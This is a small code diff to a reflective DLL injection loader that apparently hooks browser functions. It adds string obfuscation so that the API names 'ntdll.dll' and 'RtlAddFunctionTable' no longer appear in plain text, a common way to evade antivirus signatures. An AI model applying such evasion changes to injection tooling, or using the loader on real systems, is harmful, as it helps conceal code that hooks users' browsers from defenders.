@@ -26,6 +26,7 @@
 // POSSIBILITY OF SUCH DAMAGE.
 //===============================================================================================//
 #include "ReflectiveLoader.h"
+#include "obfstr.h"
 //===============================================================================================//
 // Our loader will set this to a pseudo correct HINSTANCE/HMODULE value
 HINSTANCE hAppInstance = NULL;
@@ -286,9 +287,9 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(VOID)
 	// Resolve RtlAddFunctionTable so we can register exception unwind data.
 	// Without this, stack unwinding through our hook functions crashes browsers.
 	{
-		HMODULE hNtdll = (HMODULE)pLoadLibraryA("ntdll.dll");
+		HMODULE hNtdll = (HMODULE)pLoadLibraryA(OBFS(_enc_ntdll_dll));
 		if (hNtdll)
-			pRtlAddFunctionTable = pGetProcAddress(hNtdll, "RtlAddFunctionTable");
+			pRtlAddFunctionTable = pGetProcAddress(hNtdll, OBFS(_enc_RtlAddFunctionTable));
 	}
 #endif
 
